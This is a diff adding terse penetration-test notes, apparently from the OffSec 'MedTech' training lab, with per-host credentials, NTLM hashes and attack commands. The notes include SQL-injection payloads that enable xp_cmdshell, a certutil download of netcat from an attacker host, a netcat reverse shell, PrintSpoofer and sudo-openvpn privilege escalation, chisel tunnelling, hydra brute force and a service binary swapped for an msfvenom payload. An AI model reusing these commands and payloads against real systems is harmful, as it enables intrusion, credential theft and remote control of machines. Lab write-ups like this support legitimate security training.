@@ -1082,3 +1082,175 @@ a2a20c2d55ef5721bd0c2377d12f483e
 ```
 
 4. No proof.txt on this machine
+
+
+
+
+
+## Revision 
+121 > 11 > 83 > 82 >10 > 120 > 122 > 14 > 12 > 13
+### Credentials 
+
+#### User 
+```
+Administrator 
+Guest
+joe
+krbtgt
+leon
+mario
+offsec
+peach
+wario
+yoshi
+```
+#### Pass
+```
+Flowers1
+Mushroom!
+rabbit:)
+```
+### 10
+```
+proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.10 
+C:\Users\Administrator\Desktop> type proof.txt
+13d7dccd676d263e41ce698ee9c62f11
+
+C:\Users\Administrator\Desktop> type credentials.txt
+web01: offsec/century62hisan51
+
+all done
+```
+### 11
+```
+from 121
+local and proof both 
+mimikatz = joe:08d7a47a6f9f66b97b1bae4178747494:Flowers1
+found wario user creds 
+wairo: fdf36048c1cf88f5630381c5e38feb8e: Mushroom!
+```
+### 12
+```
+proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.12
+both local and proof
+```
+### 13
+```
+proxychains impacket-psexec MEDTECH.COM/leon:'rabbit:)'@172.16.192.13
+proof 
+```
+### 14
+```
+22/tcp   open   ssh
+
+```
+### 82
+```
+proxychains crackmapexec smb 172.16.192.82 -u user.txt -p 'Mushroom!' -d medtech.com --continue-on-success
+yoshi mushroom!
+proxychains xfreerdp /u:yoshi /p:Mushroom! /d:medtech.com /v:172.16.192.82
+proot.txt
+hole file in administrator.medtech = leon:rabbit!:)
+ALL done 
+```
+### 83
+```
+from 11 
+winrs -r:CLIENT02 -u:wario -p:Mushroom! "powershell -nop -w hidden -e"
+
+local.txt 
+
+service audittracker.exe replace by msfvenom malicous file 
+
+proof.txt. 
+
+```
+### 120
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 84:72:7e:4c:bb:ff:86:ae:b0:03:00:79:a1:c5:af:34 (RSA)
+|   256 f1:31:e5:75:31:36:a2:59:f3:12:1b:58:b4:bb:dc:0f (ECDSA)
+|_  256 5a:05:9c:fc:2f:7b:7e:0b:81:a6:20:48:5a:1d:82:7e (ED25519)
+80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
+|_http-title: PAW! (PWK Awesome Website)
+|_http-server-header: WEBrick/1.6.1 (Ruby/2.7.4/2021-07-07)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+ssh offsec@192.168.192.120
+
+sudo su
+proof
+all done 
+```
+### 121
+```
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-title: MedTech
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2024-04-05T11:04:49
+|_  start_date: N/A
+
+';RECONFIGURE;--
+';EXECUTE xp_cmdshell 'whoami';--
+
+';EXEC xp_cmdshell "certutil -urlcache -f http://192.168.45.194/nc64.exe c:/windows/temp/nc64.exe";--
+';EXEC xp_cmdshell "c:\windows\temp\nc64.exe 192.168.45.194 4444 -e cmd.exe";--
+
+.\PrintSpoofer64.exe -i -c powershell.exe
+
+certutil -urlcache -f http://192.168.45.194:800/chisel-w chisel.exe
+
+.\chisel.exe client 192.168.45.194:8081 R:1080:socks 
+
+
+Done all 
+```
+### 122
+```
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60:f9:e1:44:6a:40:bc:90:e0:3f:1d:d8:86:bc:a9:3d (ECDSA)
+|_  256 24:97:84:f2:58:53:7b:a3:f7:40:e9:ad:3d:12:1e:c7 (ED25519)
+1194/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+hydra -l offsec -P /usr/share/wordlists/rockyou.txt ssh://192.168.192.122
+
+ssh offsec@192.168.192.122  
+
+local.txt
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+proof.txt
+
+
+```
